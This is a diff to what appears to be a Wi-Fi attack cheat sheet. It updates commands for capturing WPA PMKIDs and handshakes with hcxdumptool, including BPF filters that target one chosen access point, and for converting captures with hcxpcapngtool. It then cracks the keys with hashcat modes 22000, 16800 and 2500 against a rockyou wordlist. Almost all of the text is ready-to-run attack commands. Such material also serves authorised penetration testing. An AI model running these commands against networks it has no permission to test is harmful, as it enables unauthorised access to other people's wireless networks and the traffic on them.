@@ -46,21 +46,22 @@ sudo airodump-ng --band abg wlan0mon
 PMKID = HMAC-SHA1(PMK, "PMK Name" + AP_MAC + Client_MAC). Computed from first EAPOL frame.
 
 ```bash
-# Capture PMKID
-sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=3
+# hcxdumptool >= 6.3 dropped -o, --enable_status, and --filterlist_ap/--filtermode.
+# Use -w for the capture file, --rds for the realtime display, and --bpf for filters.
+sudo hcxdumptool -i wlan0mon -w capture.pcapng --rds=1
 
-# Target specific AP
-echo "AA:BB:CC:DD:EE:FF" > target_bssid.txt   # no colons in some versions
-sudo hcxdumptool -i wlan0mon -o capture.pcapng \
-  --filterlist_ap=target_bssid.txt --filtermode=2 --enable_status=3
+# Target a specific AP via BPF (build the filter with tcpdump --dump-bpf)
+sudo tcpdump -y IEEE802_11_RADIO -i wlan0mon --dump-bpf \
+  "wlan addr3 aa:bb:cc:dd:ee:ff" > target.bpf
+sudo hcxdumptool -i wlan0mon -w capture.pcapng --bpf=target.bpf --rds=1
 
-# Convert for hashcat
+# Convert for hashcat (mode 22000 is the primary output)
 hcxpcapngtool -o pmkid_hash.txt capture.pcapng
-# Or for specific format:
-hcxpcapngtool -E essidlist -I ignorelist -U usernamelist -o hash22000.txt capture.pcapng
+# Emit companion lists in parallel (these are OUTPUT files, not filters):
+hcxpcapngtool -o hash22000.txt -E essidlist.txt -I identitylist.txt -U usernamelist.txt capture.pcapng
 
-# Verify captured
-hcxpcapngtool capture.pcapng | grep PMKID
+# Verify captured PMKID/EAPOL counts
+hcxpcapngtool capture.pcapng   # stderr summary shows PMKID/EAPOL frame counts
 
 # Crack (mode 22000 — combined WPA/PMKID)
 hashcat -m 22000 pmkid_hash.txt /path/to/rockyou.txt
@@ -98,13 +99,18 @@ hashcat -m 22000 hash22000.txt rockyou.txt -r rules/best64.rule
 
 ---
 
-## Legacy format (mode 2500) — older captures
+## Legacy format (mode 2500 / 16800) — older captures
 
 ```bash
-# If capture is legacy format / older hashcat:
-# Convert with cap2hashcat or:
-hcxpcapngtool --legacy-pmkid -o hash2500.txt capture.cap
-hashcat -m 2500 hash2500.txt rockyou.txt
+# Legacy PMKID (deprecated, hashcat -m 16800 pre-6.0.0):
+hcxpcapngtool --pmkid=pmkid_legacy.txt capture.cap
+hashcat -m 16800 pmkid_legacy.txt rockyou.txt
+
+# Legacy 4-way handshake (deprecated hccapx, hashcat -m 2500):
+hcxpcapngtool --hccapx=handshake.hccapx capture.cap
+hashcat -m 2500 handshake.hccapx rockyou.txt
+
+# Modern hashcat (>= 6.0.0) accepts everything as mode 22000 via `-o file.22000`.
 ```
 
 ---
